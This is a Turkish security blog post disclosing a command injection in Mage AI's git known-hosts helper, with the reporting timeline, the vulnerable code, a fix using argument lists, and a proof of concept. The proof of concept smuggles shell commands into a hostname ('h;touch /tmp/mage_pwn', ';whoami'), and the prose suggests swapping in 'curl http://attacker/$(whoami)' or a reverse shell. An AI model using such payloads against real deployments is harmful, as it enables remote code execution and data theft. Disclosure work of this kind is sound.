---
layout: post
title: "Mage AI git config'inde command injection"
author: Yunus Aydın
date: 2026-10-06
lang: tr
description: "Mage AI'ın add_host_to_known_hosts fonksiyonunda command injection. Nisan 2024'te raporladım, 26 ay sessizlikten sonra Haziran 2026'da düzeltildi."
keywords: "mage-ai, command injection, shell=true, CWE-78, Python güvenlik, urlparse, ssh-keyscan, subprocess, data pipeline güvenlik, güvenlik araştırması"
canonical_url: "https://aydinnyunus.github.io/2026/10/06/command-injection-mage-ai-git-utils-tr/"
---

Bu OS command injection'ı [mage-ai](https://github.com/mage-ai/mage-ai) projesine 11 Nisan 2024'te [issue #4924](https://github.com/mage-ai/mage-ai/issues/4924) olarak raporladım. `bug` etiketi aldı, beş gün sonra bir maintainer'a atandı, sonra hiçbir şey olmadı. Fonksiyon `master`'da 26 ay boyunca savunmasız bekledi. 4 Haziran 2026'da başka bir contributor benim raporuma atıfla bir fix PR'ı ([#6117](https://github.com/mage-ai/mage-ai/pull/6117)) açtı; mevcut `master`'a karşı doğrulayıp onayladım, 23 Haziran'da merge edildi ve issue kapandı. Raporlamadan yamaya 26 ay.

Bunu, data orchestration tool'larının ne kadar çoğunun SSH üzerinden git'e delege ettiğini fark ettikten sonra repo'da `shell=True` arayarak buldum. Mage AI Python tabanlı bir pipeline aracı (Airflow alternatifi gibi düşün) ve git entegrasyonu kullanıcıların UI'dan remote bir repo bağlamasına izin veriyor. O URL doğrudan shell'e akıyor.

## Savunmasız kod

`mage_ai/data_preparation/git/utils.py` tek satırlık bir shell helper'ı tanımlıyor:

```python
def run_command(command: str) -> None:
    proc = subprocess.Popen(args=command, shell=True)
    proc.wait()
```

Önemli olan caller `add_host_to_known_hosts`. Kullanıcıdan remote repo URL'ini alıyor, `urlparse`'tan geçiriyor, sonucu shell string'ine besler:

```python
def add_host_to_known_hosts(remote_repo_link: str):
    url = remote_repo_link
    if url and not url.startswith('ssh://'):
        url = f'ssh://{url}'

    hostname = urlparse(url).hostname
    if hostname:
        cmd = f'ssh-keyscan -t rsa {hostname} >> {DEFAULT_KNOWN_HOSTS_FILE}'
        run_command(cmd)
        return True
    return False
```

Hostname kullanıcının kontrol ettiği string'den geliyor ve sonuç `/bin/sh -c` üzerinden çalışan bir komuta interpolate ediliyor. İkisi aynı fonksiyonda olunca işin sonu belli. `urlparse` bir URL parser, sanitizer değil. Sana şikayet etmeden, içinde shell metakarakterleri olan bir "hostname" döner.

## Proof of concept

```python
from mage_ai.data_preparation.git.utils import add_host_to_known_hosts

add_host_to_known_hosts("ssh://h;touch /tmp/mage_pwn")
```

Çıktı:

```text
>>> add_host_to_known_hosts("ssh://h;touch /tmp/mage_pwn")
True
>>> import os; os.path.exists("/tmp/mage_pwn")
True
```

Çalışan komut:

```bash
/bin/sh -c 'ssh-keyscan -t rsa h;touch /tmp/mage_pwn >> ~/.ssh/known_hosts'
```

Shell noktalı virgülü görüyor ve `touch /tmp/mage_pwn`'i ayrı bir komut olarak çalıştırıyor. Dosya yaratılıyor, fonksiyon `True` dönüyor, hata fırlatılmıyor. `touch` yerine `curl http://attacker/$(whoami)` veya bir reverse shell koy. Kullanıcı her git remote eklediğinde remote code execution alıyorsun.

2024'te dosyaladığım orijinal PoC aynı primitive'i farklı bir şekilde kullanıyordu:

```python
import subprocess
from urllib.parse import urlparse

subprocess.Popen("pwd" + urlparse("https://;whoami").hostname, shell=True)
```

Aynı root cause, daha küçük test ortamı.

## Nasıl tetikleniyor

Mage AI, proje sahibinin remote repository URL'ini girebileceği bir git settings UI sunuyor. O URL `add_host_to_known_hosts`'un input'u. Zafiyet bağlantı ilk kurulduğunda ateşleniyor. Multi-tenant deployment'ta (Mage AI yaygın olarak bir data takımı için paylaşımlı internal servis olarak çalıştırılır), git remote'unu konfigüre edebilen herhangi bir kullanıcı Mage AI process kullanıcısı olarak komut çalıştırabilir. O process tipik olarak pipeline credential'larına, warehouse bağlantılarına ve host'a bağlı cloud IAM role'üne erişim sahibi. Pratikte bu, IAM role'ünün izin verdiği etki alanıyla orchestrator üzerinde RCE demek.

## Düzeltme

`shell=True` kullanmayı bırak ve argümanları liste olarak geç. Shell metakarakterleri yorumlayamıyor çünkü ortada shell yok:

```python
def add_host_to_known_hosts(remote_repo_link: str):
    url = remote_repo_link
    if url and not url.startswith('ssh://'):
        url = f'ssh://{url}'

    hostname = urlparse(url).hostname
    if not hostname or not _is_valid_hostname(hostname):
        return False

    with open(DEFAULT_KNOWN_HOSTS_FILE, 'a') as f:
        subprocess.run(
            ['ssh-keyscan', '-t', 'rsa', hostname],
            stdout=f,
            check=False,
        )
    return True
```

İki değişiklik işin yükünü taşıyor. Liste ile `subprocess.run([...])` `/bin/sh`'i tamamen bypass ediyor, yani `h;touch /tmp/mage_pwn` gibi bir hostname `ssh-keyscan`'e tek bir literal argüman olarak geçiyor (o da zararsızca resolve edemiyor). Hostname validation belt-and-suspenders: gelecekte bir caller tekrar `shell=True`'yu sokarsa bile, sadece `[A-Za-z0-9.-]{1,253}` kabul eden bir regex orijinal payload'ı kapıda öldürürdü.

Aynı fix `create_ssh_keys`'e de uygulanmalı; o da CodeCommit URL'lerini tespit ederken aynı `urlparse` pattern'ini kullanıyor.

## Bu pattern neden tekrar tekrar çıkıyor

`shell=True` daha önce bir bash one-liner yazmış olan herkesin default mental modeli. Pipe ve redirect olarak düşünüyorsun, string olarak yazıyorsun, `subprocess.Popen` o string'i hiç şikayet etmeden kabul ediyor. Argüman listesi formu gerçekten `>>` veya `|`'ye ihtiyacın olduğunda daha hantal hissettiriyor, o yüzden insanlar istedikleri redirect'i almak için `shell=True`'ya uzanıyor ve sonra geri dönmüyor.

İşin öbür yanı, `urlparse`'ın sanitization gibi görünmesi. `hostname` attribute'u dönüyor. Değeri küçük harfe çeviriyor. Port'u siliyor. URL parse edilmiş ve valide edilmiş gibi hissettiriyor. Bunların hiçbiri güvenlik anlamında doğru değil. `urlparse` sana `https://;whoami` için de hostname dönecek, `https://$(curl attacker.com)` için de, `https://a b c` için de. O bir yapısal parser, allowlist değil. Çıktıyı bir shell komutuna interpolate etmek için güvenli kabul eden herkes contract'ı yanlış okumuş.

Aynı pattern (kullanıcı kontrolündeki URL, validation gibi görünen yapısal parsing, redirect lazım diye atılan `shell=True` one-liner'ı) SSH üzerinden git'e bağlanan neredeyse her data tool'unda çıkıyor. Geçen yıl üç başka projede daha gördüm.

## Raporlama zaman çizelgesi

- **11 Nisan 2024**: PoC ile birlikte mage-ai'a [issue #4924](https://github.com/mage-ai/mage-ai/issues/4924) olarak raporladım.
- **16 Nisan 2024**: Issue bir maintainer'a atandı. Sonra hiç aktivite yok.
- **4 Haziran 2026**: gistrec, benim raporuma atıfla mevcut `master`'a karşı doğrulanmış reproduction, minimal fix ve regression test içeren [PR #6117](https://github.com/mage-ai/mage-ai/pull/6117)'yi açtı. İnceleyip onayladım.
- **23 Haziran 2026**: PR `master`'a merge edildi, issue #4924 kapandı. Toplam açık kalma süresi: 26 ay.
- **24 Temmuz 2026**: Devam issue'su [#6166](https://github.com/mage-ai/mage-ai/issues/6166): yamalanmış fonksiyon `ssh-keyscan` başarısız olduğunda yine de `True` dönüyor. Fix injection'ı kapattı, özensizliği kapatmadı.

Mage AI'ı production'da çalıştırıyorsan, PR #6117'yi içeren bir sürüme geç. Eski bir sürüm ya da fork çalıştırıyorsan, remote konfigüre edebilen her kullanıcı için git settings sayfası hala bir RCE yüzeyi. Bir şey maintain ediyorsan: elinde çalışan PoC olan bir reporter'ı tek satırlık fix için 26 ay bekletme.

## Referanslar

- **mage-ai issue #4924**: [https://github.com/mage-ai/mage-ai/issues/4924](https://github.com/mage-ai/mage-ai/issues/4924)
- **mage-ai PR #6117** (önerilen fix): [https://github.com/mage-ai/mage-ai/pull/6117](https://github.com/mage-ai/mage-ai/pull/6117)
- **CWE-78**: [Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- **Semgrep cheat sheet**: [Python command injection](https://semgrep.dev/docs/cheat-sheets/python-command-injection/)

## İlgili içerik

- [NLTK collocations'da command injection](/2026/06/07/command-injection-nltk-collocations-eval-tr/)
- [CPython http.server ve wsgiref'te CRLF injection](/2026/04/24/crlf-injection-cpython-http-server-wsgiref-tr/)
- [Private-network kontrollerinde DNS rebinding ile SSRF](/2026/03/14/ssrf-dns-rebinding-vulnerability-tr/)
